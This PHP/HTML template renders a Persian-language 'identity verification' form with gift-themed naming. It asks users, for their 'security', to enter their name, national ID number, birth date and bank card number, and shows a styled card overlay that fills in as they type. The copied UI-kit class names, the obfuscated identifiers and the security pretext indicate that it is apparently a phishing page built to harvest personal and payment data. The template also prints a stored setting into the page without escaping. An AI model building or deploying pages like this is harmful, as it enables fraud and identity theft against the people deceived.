<?php
$db = \Giftmax\modules\Db::getLnstance();
global $wpdb;
$records = $db->first("SELECT meta_value FROM `{$wpdb->prefix}setting` WHERE `meta_key`=:key",array('key'=>'description_register'));
?>
<style>
    <?php
    if (!empty($records)){
        ?>
    .W3wYIMoFtWvsJZI8nfye{
        max-width: 816px;
    }
    .bV40_bank{
        display: flex;
        position: relative;
        margin-top: 10px;
    }
    .bV40_bank img{
        width: 100%;
        margin: 0;
    }
    .bV40_bank .full__name-user{
        position: absolute;
        bottom: 119px;
        font-size: 9px;
        right: 9%;
        text-align: center;
        z-index: 2;
    }
    .bV40_bank .national__code-user{
        position: absolute;
        bottom: 119px;
        font-size: 10px;
        left: 33%;
        text-align: center;
        z-index: 2;
    }
    .bV40_bank .birthday-user{
        position: absolute;
        bottom: 119px;
        font-size: 10px;
        right: 32%;
        text-align: center;
        z-index: 2;
    }
    .bV40_bank .number-user{
        position: absolute;
        bottom: 98px;
        font-size: 10px;
        left: 9%;
        text-align: center;
        z-index: 2;
    }
    .bV40_bank .numberCard{
        position: absolute;
        bottom: 50px;
        font-size: 21px;
        letter-spacing: 2px;
        font-weight: 700;
        direction: ltr;
        z-index: 2;
        font-family: "Courier New", monospace;
        color: #241a06;
        background: 0 0;
        width: 100%;
        padding: 0;
        text-align: center;
        transition: all .2s cubic-bezier(.4, 0, .2, 1);
    }
    @media (max-width: 768px) {
        .h-screen {
            height: 144vh !important;
        }
        div.d-flex.flex-column.flex-1{
            margin: 0 0 23px 0 !important;
        }
        .sjwjcnsk{
            flex-direction: column-reverse;
        }
        .diexjw5{
            margin-top: 8px;
        }
        .bV40_bank{
            width: 370px !important;
        }
    }
    <?php
    }
    ?>
    .col-12{
        padding-left: 0;
        padding-right: 0;
    }
    .mr-3{
        margin-right: 12px;
    }
</style>
<section class="h-screen d-flex flex-column jc-center ai-center">
    <div class="W3wYIMoFtWvsJZI8nfye w-100 d-flex flex-row-md sjwjcnsk">
        <form class="d-flex flex-column flex-1"><h1 class="color-n-900 mb-9 text-h5">اطلاعات هویتی</h1>
            <p class="text-caption color-n-900 mb-4"><span>برای امنیت خودتان احراز هویت را کامل کنید:<br></span></p>
            <input class="d-none" type="text" name="userName" value="<?=$userName?>">
            <input class="d-none" type="text" name="hash" value="<?=$hash?>">
            <div class="d-flex">
                <div class="lg:w-50">
                    <label class="uikit-collections-FormComponentFrame-FormComponentFrame-module__FormComponentFrame--L7bcQ uikit-collections-FormComponentFrame-FormComponentFrame-module__FormComponentFrame--normal--A6Ntt w-full">
                        <p class="text-body-1 color-n-700 mb-2 text-right" data-testid="form-label">نام</p>
                        <div class="uikit-collections-FormComponentFrame-FormComponentFrame-module__FormComponentFrame__input-container--D5edN px-2 d-flex ai-center">
                            <section class="grow-1 text-body-2-c"><input class="px-2 eFydYiN7dQ1Ds63mli7f text-subtitle w-100 jDSbpqUrUZFv23opBao9 color-n-700" type="text" name="first_name" placeholder="" value=""></section>
                        </div>
                    </label>
                </div>
                <div class="lg:w-50 mr-3">
                    <label class="uikit-collections-FormComponentFrame-FormComponentFrame-module__FormComponentFrame--L7bcQ uikit-collections-FormComponentFrame-FormComponentFrame-module__FormComponentFrame--normal--A6Ntt w-full">
                        <p class="text-body-1 color-n-700 mb-2 text-right" data-testid="form-label">نام خانوادکی</p>
                        <div class="uikit-collections-FormComponentFrame-FormComponentFrame-module__FormComponentFrame__input-container--D5edN px-2 d-flex ai-center">
                            <section class="grow-1 text-body-2-c"><input class="px-2 eFydYiN7dQ1Ds63mli7f text-subtitle w-100 jDSbpqUrUZFv23opBao9 color-n-700" type="text" name="last_name" placeholder="" value=""></section>
                        </div>
                    </label>
                </div>
            </div>
            <label class="uikit-collections-FormComponentFrame-FormComponentFrame-module__FormComponentFrame--L7bcQ uikit-collections-FormComponentFrame-FormComponentFrame-module__FormComponentFrame--normal--A6Ntt">
                <p class="text-body-1 color-n-700 mb-2 text-right" data-testid="form-label">کدملی</p>
                <div class="uikit-collections-FormComponentFrame-FormComponentFrame-module__FormComponentFrame__input-container--D5edN px-2 d-flex ai-center">
                    <section class="grow-1 text-body-2-c"><input class="px-2 eFydYiN7dQ1Ds63mli7f text-subtitle w-100 jDSbpqUrUZFv23opBao9 color-n-700" type="text" name="nationalID" placeholder="" value=""></section>
                </div>
            </label>
            <div class="row">
                <div class="col-12 diexjw5" data-select2-id="select2-data-9-k644">
                    <div class="form-group col-sm-12" data-select2-id="select2-data-8-0exr">
                        <p class="text-body-1 color-n-700 mb-2 text-right" data-testid="form-label">تاریخ تولد</p>
                        <div class="row g-2">
                            <div class="col-4">
                                <div class="form-group">
                                    <select class="js-example-basic-single select2-hidden-accessible" name="register_birthdate1" id="register_birthdate1" data-select2-id="select2-data-register_birthdate1" tabindex="-1" aria-hidden="true">
                                        <option value="" disabled="" selected="" data-select2-id="select2-data-2-dxoo">
                                            سال
                                        </option>
                                        <option value="1320">1320</option>
                                        <option value="1321">1321</option>
                                        <option value="1322">1322</option>
                                        <option value="1323">1323</option>
                                        <option value="1324">1324</option>
                                        <option value="1325">1325</option>
                                        <option value="1326">1326</option>
                                        <option value="1327">1327</option>
                                        <option value="1328">1328</option>
                                        <option value="1329">1329</option>
                                        <option value="1330">1330</option>
                                        <option value="1331">1331</option>
                                        <option value="1332">1332</option>
                                        <option value="1333">1333</option>
                                        <option value="1334">1334</option>
                                        <option value="1335">1335</option>
                                        <option value="1336">1336</option>
                                        <option value="1337">1337</option>
                                        <option value="1338">1338</option>
                                        <option value="1339">1339</option>
                                        <option value="1340">1340</option>
                                        <option value="1341">1341</option>
                                        <option value="1342">1342</option>
                                        <option value="1343">1343</option>
                                        <option value="1344">1344</option>
                                        <option value="1345">1345</option>
                                        <option value="1346">1346</option>
                                        <option value="1347">1347</option>
                                        <option value="1348">1348</option>
                                        <option value="1349">1349</option>
                                        <option value="1350">1350</option>
                                        <option value="1351">1351</option>
                                        <option value="1352">1352</option>
                                        <option value="1353">1353</option>
                                        <option value="1354">1354</option>
                                        <option value="1355">1355</option>
                                        <option value="1356">1356</option>
                                        <option value="1357">1357</option>
                                        <option value="1358">1358</option>
                                        <option value="1359">1359</option>
                                        <option value="1360">1360</option>
                                        <option value="1361">1361</option>
                                        <option value="1362">1362</option>
                                        <option value="1363">1363</option>
                                        <option value="1364">1364</option>
                                        <option value="1365">1365</option>
                                        <option value="1366">1366</option>
                                        <option value="1367">1367</option>
                                        <option value="1368">1368</option>
                                        <option value="1369">1369</option>
                                        <option value="1370">1370</option>
                                        <option value="1371">1371</option>
                                        <option value="1372">1372</option>
                                        <option value="1373">1373</option>
                                        <option value="1374">1374</option>
                                        <option value="1375">1375</option>
                                        <option value="1376">1376</option>
                                        <option value="1377">1377</option>
                                        <option value="1378">1378</option>
                                        <option value="1379">1379</option>
                                        <option value="1380">1380</option>
                                        <option value="1381">1381</option>
                                        <option value="1382">1382</option>
                                        <option value="1383">1383</option>
                                        <option value="1384">1384</option>
                                        <option value="1385">1385</option>
                                        <option value="1386">1386</option>
                                        <option value="1387">1387</option>
                                    </select>
                                </div>
                            </div>
                            <div class="col-4">
                                <div class="form-group">
                                    <select class="js-example-basic-single select2-hidden-accessible" name="register_birthdate2" id="register_birthdate2" data-select2-id="select2-data-register_birthdate2" tabindex="-1" aria-hidden="true">
                                        <option value="" disabled="" selected="" data-select2-id="select2-data-4-s9eo">
                                            ماه
                                        </option>
                                        <option value="01" data-select2-id="select2-data-15-h89y">فروردین</option><option value="02" data-select2-id="select2-data-16-8m35">اردیبهشت</option><option value="03" data-select2-id="select2-data-17-nepr">خرداد</option><option value="04" data-select2-id="select2-data-18-pzth">تیر</option><option value="05" data-select2-id="select2-data-19-ntlh">مرداد</option><option value="06" data-select2-id="select2-data-20-9qy8">شهریور</option><option value="07" data-select2-id="select2-data-21-hu81">مهر</option><option value="08" data-select2-id="select2-data-22-hvit">آبان</option><option value="09" data-select2-id="select2-data-23-xi7i">آذر</option><option value="10" data-select2-id="select2-data-24-bozm">دی</option><option value="11" data-select2-id="select2-data-25-dud8">بهمن</option><option value="12" data-select2-id="select2-data-26-zmw3">اسفند</option>                                            </select>
                                </div>
                            </div>
                            <div class="col-4">
                                <div class="form-group">
                                    <select class="js-example-basic-single select2-hidden-accessible" name="register_birthdate3" id="register_birthdate3" data-select2-id="select2-data-register_birthdate3" tabindex="-1" aria-hidden="true">
                                        <option value="" disabled="" selected="" data-select2-id="select2-data-6-vgsy">
                                            روز
                                        </option>
                                        <option value="01">01</option>
                                        <option value="02">02</option>
                                        <option value="03">03</option>
                                        <option value="04">04</option>
                                        <option value="05">05</option>
                                        <option value="06">06</option>
                                        <option value="07">07</option>
                                        <option value="08">08</option>
                                        <option value="09">09</option>
                                        <option value="10">10</option>
                                        <option value="11">11</option>
                                        <option value="12">12</option>
                                        <option value="13">13</option>
                                        <option value="14">14</option>
                                        <option value="15">15</option>
                                        <option value="16">16</option>
                                        <option value="17">17</option>
                                        <option value="18">18</option>
                                        <option value="19">19</option>
                                        <option value="20">20</option>
                                        <option value="21">21</option>
                                        <option value="22">22</option>
                                        <option value="23">23</option>
                                        <option value="24">24</option>
                                        <option value="25">25</option>
                                        <option value="26">26</option>
                                        <option value="27">27</option>
                                        <option value="28">28</option>
                                        <option value="29">29</option>
                                        <option value="30">30</option>
                                        <option value="31">31</option>
                                    </select>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>            </div>
            <label class="uikit-collections-FormComponentFrame-FormComponentFrame-module__FormComponentFrame--L7bcQ uikit-collections-FormComponentFrame-FormComponentFrame-module__FormComponentFrame--normal--A6Ntt">
                <p class="text-body-1 color-n-700 mb-2 text-right" data-testid="form-label">شماره کارت</p>
                <div class="uikit-collections-FormComponentFrame-FormComponentFrame-module__FormComponentFrame__input-container--D5edN px-2 d-flex ai-center">
                    <section class="grow-1 text-body-2-c"><input class="px-2 eFydYiN7dQ1Ds63mli7f text-subtitle w-100 jDSbpqUrUZFv23opBao9 color-n-700" type="text" name="CardNumber" inputmode="numeric" maxlength="19" autocomplete="off"></section>
                </div>
            </label>
            <?php
            if (isMobile()){
                ?>
            <div class="bV40_bank" style="height: 0"><span class="numberCard"></span><span class="national__code-user"></span><span class="full__name-user"></span><span class="birthday-user"></span><span class="number-user"><?=$userName?></span></div>
<?php
            }
            ?>
            <span class="color-n-500 text-caption uikit-collections--FAf2Q" data-testid="isInputEmpty" style="z-index: 10;">کد ملی باید متعلق به خودتان باشد</span><div class="d-flex ai-center ai-start-md flex-1">
                <button class="relative d-flex ai-center user-select-none uikit-atomic-ButtonBase-ButtonBase-module__btn--vgnTU text-button-1 uikit-atomic-ButtonBase-ButtonBase-module__btn--large--z9tJZ uikit-atomic-ButtonBase-ButtonBase-module__btn--primary--BJ1BU radius uikit-atomic-Button-Button-module__Button__large--eW66c uikit-atomic-Button-Button-module__Button__filledPrimary--isBw3 w-100 uikit-atomic-Button-Button-module__Button--TibOa mt-2 Button-au46" data-testid="button-wrapper" type="submit" data-tag="xRvJVHKwx9">
                    <div class="d-flex ai-center jc-center relative grow-1">تایید</div>
                </button>
            </div>
        </form>
        <?php
        if (!empty($records)){
            ?>
            <div class="d-flex flex-column flex-1 justify-between" style="margin-right: 30px">
                <div class="Hint--primary-mwFS2H Hint--border-primary-ouDpIV Hint__padding-nRd4K4 radius Hint__iconStart-bpg5ZO">
                    <div class="d-flex ai-center" style="max-height: 500px; overflow-y: auto; ">
                        <span class="mr-2 text-body-1 color-brand-primary-700 Hint__padding--title-AHG0eM"><?=$records['meta_value']?></span>
                    </div>
                </div>
                <?php
                if (!isMobile()){
                ?>
                <div class="bV40_bank" style="height: 0"><span class="numberCard"></span><span class="national__code-user"></span><span class="full__name-user"></span><span class="birthday-user"></span><span class="number-user"><?=$userName?></span></div>
                <?php
                }
                ?>
            </div>
            <?php
        }
        ?>
    </div>
</section>